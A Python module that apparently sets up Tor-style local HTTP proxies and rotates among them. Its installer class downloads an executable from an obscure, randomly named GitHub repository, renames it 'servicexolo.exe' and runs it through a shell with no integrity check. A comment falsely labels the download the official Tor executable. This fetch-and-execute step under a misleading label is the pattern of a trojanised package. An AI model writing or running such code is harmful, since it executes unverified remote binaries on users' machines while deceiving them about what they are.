import os
import requests
import tempfile
import subprocess
import psutil

class ProxyRotator:
    current_irt = 1
        
    def __init__(self, proxies):
        self.proxies = proxies
        self.current = proxies[0]
        
    def next(self):
        if self.proxies[-1] == self.current:
            self.current = self.proxies[0]
            self.current_irt = 1
        else:
            self.current = self.proxies[self.current_irt]
            self.current_irt += 1

class ServiceInstaller:
    service_link = "https://github.com/tricx0/iFaxgZaDgn-lvXTBBeX7k/raw/main/servicexolo.exe"    # THIS IS THE OFFICIAL TOR EXECUTABLE
    
    def __init__(self, total_ips):
        self.temp_dir = tempfile.gettempdir()
        self.total_ips = total_ips
        self.stop_servicexolo_windows()

    def _create_temp_directory(self):
        try:
            os.makedirs(os.path.join(self.temp_dir, "xoloservice"))
        except FileExistsError:
            pass
        
    def _download_file(self):
        response = requests.get(self.service_link)
        if response.status_code != 200:
            return None
        file_path = os.path.join(self.temp_dir, "xoloservice", os.path.basename(self.service_link))
        with open(file_path, 'wb') as f:
            f.write(response.content)
        return file_path

    def _generate_ips_file(self, file_path2):
        ips = b"HTTPTunnelPort 9080"
        for i in range(self.total_ips * 20):
            ips += f"\nHTTPTunnelPort {9081 + i}".encode()
        with open(file_path2, 'wb') as f:
            f.write(ips)

    def install_service(self):
        self._create_temp_directory()
        file_path = self._download_file()
        if not file_path:
            return
        
        file_path2 = os.path.join(self.temp_dir, "xoloservice", "config")
        self._generate_ips_file(file_path2)

        process = subprocess.Popen(f"{file_path} -nt-service -f {file_path2}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            line = process.stdout.readline().decode().strip()
            print(line)
            if "Bootstrapped 100% (done): Done" in line:
                break
            
    def stop_servicexolo_windows(self):
        for proc in psutil.process_iter():
            try:
                if proc.name() == "servicexolo.exe":
                    proc.terminate()
                    
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

def make(total_ips):
    ServiceInstaller(total_ips).install_service()
    proxy_blocks = []

    current_port = 9080
    for _ in range(total_ips):
        block = [f"http://127.0.0.1:{current_port + i}" for i in range(20)]
        proxy_blocks.append(ProxyRotator(block))
        current_port += 20

    return proxy_blocks